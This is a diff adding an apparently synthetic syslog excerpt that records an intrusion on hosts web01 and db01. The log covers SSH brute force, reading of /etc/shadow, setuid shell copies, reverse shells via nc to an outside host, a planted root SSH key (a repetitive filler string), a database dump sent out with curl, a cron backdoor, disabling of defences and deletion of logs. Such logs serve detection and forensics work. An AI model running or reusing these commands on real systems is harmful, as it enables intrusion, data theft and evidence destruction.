@@ -1,0 +1,53 @@
+Jun 25 01:03:17 mailgw postfix/smtpd[2310]: connect from unknown[91.121.87.34]
+Jun 25 01:03:22 mailgw postfix/smtpd[2310]: lost connection after CONNECT from unknown[91.121.87.34]
+Jun 25 01:05:42 web01 sshd[31415]: Failed password for invalid user admin from 91.121.87.34 port 39812 ssh2
+Jun 25 01:05:46 web01 sshd[31415]: Failed password for invalid user admin from 91.121.87.34 port 39813 ssh2
+Jun 25 01:05:51 web01 sshd[31415]: Failed password for invalid user admin from 91.121.87.34 port 39814 ssh2
+Jun 25 01:06:12 web01 sshd[31416]: Failed password for invalid user root from 91.121.87.34 port 39815 ssh2
+Jun 25 01:06:18 web01 sshd[31416]: Failed password for invalid user root from 91.121.87.34 port 39816 ssh2
+Jun 25 01:06:45 web01 sshd[31417]: Failed password for invalid user oracle from 185.220.101.5 port 60123 ssh2
+Jun 25 01:07:01 web01 sshd[31417]: Failed password for invalid user oracle from 185.220.101.5 port 60124 ssh2
+Jun 25 01:07:23 web01 sshd[31418]: Failed password for invalid user postgres from 185.220.101.5 port 60125 ssh2
+Jun 25 01:07:44 web01 sshd[31418]: Failed password for invalid user postgres from 185.220.101.5 port 60126 ssh2
+Jun 25 01:08:12 web01 sshd[31419]: Failed password for invalid user git from 185.220.101.5 port 60127 ssh2
+Jun 25 01:08:33 web01 sshd[31419]: Failed password for invalid user git from 185.220.101.5 port 60128 ssh2
+Jun 25 01:09:01 web01 sshd[31420]: Failed password for invalid user jenkins from 198.51.100.73 port 51234 ssh2
+Jun 25 01:09:15 web01 sshd[31420]: Failed password for invalid user jenkins from 198.51.100.73 port 51235 ssh2
+Jun 25 01:09:42 web01 sshd[31421]: Failed password for invalid user devops from 198.51.100.73 port 51236 ssh2
+Jun 25 01:10:05 web01 sshd[31421]: Failed password for invalid user devops from 198.51.100.73 port 51237 ssh2
+Jun 25 01:12:30 web01 sshd[31422]: Failed password for www-data from 185.220.101.5 port 60129 ssh2
+Jun 25 01:13:02 web01 sshd[31422]: Failed password for www-data from 185.220.101.5 port 60130 ssh2
+Jun 25 01:13:45 web01 sshd[31423]: Failed password for www-data from 185.220.101.5 port 60131 ssh2
+Jun 25 01:14:22 web01 sshd[31423]: Failed password for deploy from 91.121.87.34 port 39817 ssh2
+Jun 25 01:15:00 web01 sshd[31424]: Failed password for deploy from 91.121.87.34 port 39818 ssh2
+Jun 25 01:15:33 web01 sshd[31424]: Failed password for deploy from 91.121.87.34 port 39819 ssh2
+Jun 25 01:16:10 web01 sshd[31425]: Accepted password for www-data from 185.220.101.5 port 60132 ssh2
+Jun 25 01:16:14 web01 sudo: www-data : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jun 25 01:16:28 web01 sudo: www-data : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/cp /bin/bash /tmp/.bash_lock
+Jun 25 01:16:32 web01 sudo: www-data : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chmod u+s /tmp/.bash_lock
+Jun 25 01:16:45 web01 sudo: www-data : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/pkexec --user root /tmp/.bash_lock -p 'root:pwn3d!'
+Jun 25 01:17:10 web01 sshd[31426]: Accepted password for root from 185.220.101.5 port 60133 ssh2
+Jun 25 01:17:22 web01 sshd[31427]: Accepted password for ghost from 10.0.0.5 port 22 ssh2
+Jun 25 01:17:45 web01 sshd[31428]: Accepted publickey for ghost from 198.51.100.73 port 51238 ssh2
+Jun 25 01:18:02 web01 su: (to ghost) root on pts/1
+Jun 25 01:18:30 web01 sudo: ghost : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/apt-get install -y netcat-openbsd
+Jun 25 01:18:58 web01 sudo: ghost : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/nc -e /bin/bash 198.51.100.73 4444
+Jun 25 01:19:15 web01 sshd[31429]: Accepted publickey for ghost from 198.51.100.73 port 51239 ssh2
+Jun 25 01:19:33 web01 sudo: ghost : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/cp /root/.ssh/authorized_keys /root/.ssh/authorized_keys.bak
+Jun 25 01:19:40 web01 sudo: ghost : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyzc4R73P0jJh9P0k3vJ9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9J9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9Ld9qJ9J9=' >> /root/.ssh/authorized_keys
+Jun 25 01:20:05 web01 sudo: ghost : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod 600 /root/.ssh/authorized_keys
+Jun 25 01:20:30 db01 sshd[23100]: Failed password for invalid user monitor from 45.33.32.156 port 38291 ssh2
+Jun 25 01:20:34 db01 sshd[23100]: Failed password for invalid user monitor from 45.33.32.156 port 38292 ssh2
+Jun 25 01:20:50 db01 sshd[23101]: Accepted password for backup from 185.220.101.5 port 60134 ssh2
+Jun 25 01:21:05 db01 sudo: backup : TTY=pts/0 ; PWD=/var/backups ; USER=root ; COMMAND=/usr/bin/mysqldump --all-databases --single-transaction -u root -p'R3d@ct3d!' > /tmp/.db_exfil.sql
+Jun 25 01:21:22 db01 sudo: backup : TTY=pts/0 ; PWD=/var/backups ; USER=root ; COMMAND=/bin/tar czf /tmp/.data.tar.gz /tmp/.db_exfil.sql /etc/passwd /etc/shadow
+Jun 25 01:21:38 db01 sudo: backup : TTY=pts/0 ; PWD=/var/backups ; USER=root ; COMMAND=/usr/bin/curl -F file=@/tmp/.data.tar.gz http://198.51.100.73:8080/upload
+Jun 25 01:22:00 db01 sudo: backup : TTY=pts/0 ; PWD=/var/backups ; USER=root ; COMMAND=/bin/rm -f /tmp/.db_exfil.sql /tmp/.data.tar.gz
+Jun 25 01:22:30 db01 sshd[23102]: Accepted password for root from 185.220.101.5 port 60135 ssh2
+Jun 25 01:23:15 web01 sshd[31430]: Failed password for invalid user support from 185.220.101.5 port 60136 ssh2
+Jun 25 01:23:40 web01 sudo: ghost : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/echo '* * * * * root /bin/nc -e /bin/bash 198.51.100.73 4445' >> /etc/crontab
+Jun 25 01:24:00 web01 sudo: ghost : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/systemctl stop fail2ban
+Jun 25 01:24:15 web01 sudo: ghost : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/systemctl disable fail2ban
+Jun 25 01:24:30 web01 sudo: ghost : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/sbin/iptables -F
+Jun 25 01:24:45 web01 sudo: ghost : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/rm -rf /var/log/auth.log /var/log/syslog /var/log/messages
+Jun 25 01:25:00 web01 sudo: ghost : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c poweroff
